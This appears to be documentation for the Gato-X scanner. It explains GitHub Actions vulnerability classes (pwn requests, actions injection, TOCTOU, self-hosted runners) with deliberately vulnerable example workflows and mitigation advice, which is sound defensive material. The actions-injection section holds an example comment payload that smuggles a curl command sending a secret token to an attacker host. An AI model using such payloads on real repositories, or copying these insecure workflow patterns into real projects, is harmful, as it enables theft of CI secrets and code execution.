# Understanding GitHub Actions Vulnerabilities

This page provides detailed explanations of the vulnerability types that Gato-X can identify in GitHub Actions workflows.

## Pwn Requests

Pwn Requests are a class of vulnerabilities that allow attackers to execute code in a GitHub Actions workflow by submitting a pull request.

### How They Work

1. A repository has a workflow that uses the `pull_request_target` event trigger
2. The workflow accesses user-controlled content from the pull request
3. The workflow executes this content with elevated permissions

### Example Vulnerable Workflow

```yaml
name: Vulnerable Workflow
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Run script from PR
        run: |
          chmod +x ./scripts/build.sh
          ./scripts/build.sh
```

### Why It's Dangerous

The `pull_request_target` event runs with the permissions of the target repository, including access to secrets. By checking out code from the pull request and executing it, the workflow allows attackers to run arbitrary code with these elevated permissions.

## Actions Injection

Actions Injection vulnerabilities allow attackers to execute arbitrary code by injecting malicious input into workflow steps.

### How They Work

1. A workflow uses user-controlled input (like issue comments or PR titles)
2. This input is used directly in commands or scripts without proper validation
3. Attackers can inject shell commands that will be executed by the workflow

### Example Vulnerable Workflow

```yaml
name: Issue Comment Handler
on:
  issue_comment:
    types: [created]

jobs:
  process-comment:
    if: contains(github.event.comment.body, '/deploy')
    runs-on: ubuntu-latest
    steps:
      - name: Process deployment request
        run: |
          ENVIRONMENT=$(echo "${{ github.event.comment.body }}" | awk '{print $2}')
          ./deploy.sh $ENVIRONMENT
```

### Why It's Dangerous

In this example, an attacker could comment `/deploy prod; curl http://attacker.com/exfil?token=$SECRET_TOKEN;` to inject additional commands that would be executed by the workflow.

## TOCTOU Vulnerabilities

Time-of-Check to Time-of-Use (TOCTOU) vulnerabilities occur when there's a gap between when a workflow checks conditions and when it uses resources.

### How They Work

1. A workflow checks conditions (like branch protection or permissions)
2. Between the check and the execution, the conditions change
3. The workflow executes with assumptions that are no longer valid

### Example Vulnerable Workflow

```yaml
name: TOCTOU Vulnerable Workflow
on:
  workflow_dispatch:
    inputs:
      branch:
        description: 'Branch to deploy'
        required: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.inputs.branch }}
      - name: Check if user has write access
        id: check_permissions
        run: |
          # Check if user has write access to the branch
          if [[ $(gh api repos/${{ github.repository }}/collaborators/${{ github.actor }}/permission | jq -r .permission) == "write" ]]; then
            echo "::set-output name=has_permission::true"
          else
            echo "::set-output name=has_permission::false"
          fi
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      - name: Deploy
        if: steps.check_permissions.outputs.has_permission == 'true'
        run: ./deploy.sh
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
```

### Why It's Dangerous

In this example, an attacker could have write access when the check is performed, but lose it before the deployment step. Alternatively, they could modify the branch content after the check but before the deployment.

## Self-Hosted Runner Vulnerabilities

Self-hosted runners can introduce various security risks, especially when they're configured to run workflows from public repositories or forks.

### How They Work

1. A repository uses self-hosted runners for its workflows
2. The runners are configured to run workflows from public repositories or forks
3. Attackers can submit workflows that execute on these runners

### Example Vulnerable Configuration

```yaml
name: CI on Self-Hosted Runner
on:
  pull_request:
    branches: [ main ]

jobs:
  build:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v3
      - name: Build and test
        run: |
          npm install
          npm test
```

### Why It's Dangerous

If this workflow runs on pull requests from forks without approval requirements, attackers can submit malicious workflows that execute on the self-hosted runner. This could lead to:

1. Access to secrets available to the runner
2. Access to the runner's file system and network
3. Potential lateral movement within the organization's network
4. Persistence through the Runner-on-Runner technique

## Mitigation Strategies

### For Pwn Requests

- Avoid using `pull_request_target` when possible
- If you must use it, don't check out untrusted code
- Use `github.base_ref` instead of `github.event.pull_request.head.sha`
- Implement proper input validation

### For Actions Injection

- Validate and sanitize all user inputs
- Use explicit allow-lists for permitted values
- Avoid using user input directly in commands
- Use GitHub's `contains()` function with an array of allowed values

### For TOCTOU Vulnerabilities

- Minimize the time between checks and actions
- Re-verify critical conditions before executing sensitive operations
- Use GitHub's built-in permission checks when possible

### For Self-Hosted Runners

- Use ephemeral runners that are destroyed after each job
- Implement approval requirements for workflows from forks
- Run runners in isolated environments (containers or VMs)
- Apply the principle of least privilege to runner permissions
